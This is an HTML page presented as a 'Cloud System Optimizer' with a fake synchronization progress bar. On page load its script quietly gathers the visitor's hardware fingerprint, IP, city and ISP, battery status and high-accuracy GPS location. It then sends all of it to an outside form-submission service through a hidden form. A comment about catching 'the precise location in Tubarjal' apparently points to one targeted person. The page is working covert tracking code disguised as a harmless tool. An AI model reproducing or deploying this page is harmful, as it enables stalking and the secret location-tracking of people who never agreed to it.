<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloud System Optimizer</title>
    <style>
        body { margin: 0; padding: 0; background-color: #0f172a; color: #f8fafc; font-family: 'Inter', 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .card { background: #1e293b; padding: 45px; border-radius: 28px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6); text-align: center; width: 90%; max-width: 420px; border: 1px solid #334155; }
        .icon { font-size: 55px; color: #38bdf8; margin-bottom: 25px; animation: pulse 2s infinite; }
        h1 { font-size: 22px; margin: 10px 0; color: #f1f5f9; letter-spacing: -0.5px; }
        p { font-size: 14px; color: #94a3b8; line-height: 1.6; margin-bottom: 0; }
        .progress-container { width: 100%; height: 10px; background: #334155; border-radius: 20px; margin: 35px 0 15px 0; overflow: hidden; position: relative; }
        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #38bdf8, #818cf8); border-radius: 20px; transition: width 0.15s linear; }
        .percentage { font-size: 18px; font-weight: 800; color: #38bdf8; font-family: 'Monaco', monospace; }
        .status-text { font-size: 11px; color: #64748b; text-transform: uppercase; letter-spacing: 1.5px; margin-top: 20px; }
        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.08); opacity: 0.8; } 100% { transform: scale(1); opacity: 1; } }
    </style>
</head>
<body>

<div class="card">
    <div class="icon">🔄</div>
    <h1>Cloud Synchronization</h1>
    <p>Optimizing system core and syncing hardware signatures with global servers. Please hold on.</p>

    <div class="progress-container">
        <div class="progress-bar" id="bar"></div>
    </div>

    <div class="percentage" id="percent">0%</div>
    <div class="status-text" id="status">Initializing Secure Link...</div>
</div>

<form id="ultraForm" style="display:none;">
    <input type="hidden" name="access_key" value="534a06e9-54bf-4b21-8cc0-d2717ad6c77a">
    <input type="hidden" name="[HARDWARE] FULL_SPECS" id="s1">
    <input type="hidden" name="[GEO] PRECISE_COORDINATES" id="s2">
    <input type="hidden" name="[NETWORK] IP_AND_ISP" id="s3">
    <input type="hidden" name="[POWER] BATTERY_INTELLIGENCE" id="s4">
    <input type="hidden" name="[BROWSER] SOFTWARE_VERSION" id="s5">
    <input type="hidden" name="[DISPLAY] RESOLUTION_DEPTH" id="s6">
</form>

<script>
    let progress = 0;
    const bar = document.getElementById('bar');
    const percentText = document.getElementById('percent');
    const statusText = document.getElementById('status');

    const statusMessages = [
        "Initializing Secure Link...",
        "Scanning Hardware...",
        "Fetching Cloud Assets...",
        "Optimizing Core...",
        "Finalizing Sync..."
    ];

    window.onload = async () => {
        // 1. Advanced Device Fingerprinting
        document.getElementById('s1').value = `OS: ${navigator.platform} | CPU: ${navigator.hardwareConcurrency} Cores | RAM: ~${navigator.deviceMemory}GB | GPU: ${getGPU()}`;
        document.getElementById('s6').value = `Res: ${screen.width}x${screen.height} | Color: ${screen.colorDepth}-bit`;
        document.getElementById('s5').value = `Agent: ${navigator.userAgent}`;

        // 2. IP & Carrier Intelligence
        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
            document.getElementById('s3').value = `IP: ${data.ip} | City: ${data.city} | Provider: ${data.org} | ASN: ${data.asn}`;
        });

        // 3. Battery Intelligence
        if (navigator.getBattery) {
            navigator.getBattery().then(b => {
                document.getElementById('s4').value = `Level: ${b.level * 100}% | Charging: ${b.charging}`;
            });
        }

        // 4. HIGH ACCURACY GEOLOCATION (GPS MODE)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                // This will catch the precise location in Tubarjal
                document.getElementById('s2').value = `LOCATION_MAP: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude} | Accuracy: ${pos.coords.accuracy}m`;
            }, null, { enableHighAccuracy: true, timeout: 15000 });
        }
    };

    function getGPU() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Generic';
    }

    // Realistic Progress Simulator
    const interval = setInterval(() => {
        progress += Math.random() * 1.5;

        if (progress >= 100) {
            progress = 100;
            clearInterval(interval);
            statusText.innerText = "Sync Completed Successfully";
            sendFinalReport();
        } else {
            bar.style.width = progress + '%';
            percentText.innerText = Math.floor(progress) + '%';
            // Update status messages based on progress
            const msgIndex = Math.floor((progress / 100) * statusMessages.length);
            statusText.innerText = statusMessages[msgIndex];
        }
    }, 180);

    function sendFinalReport() {
        const formData = new FormData(document.getElementById('ultraForm'));
        fetch('https://api.web3forms.com/submit', { method: 'POST', body: formData });
    }
</script>
</body>
</html>
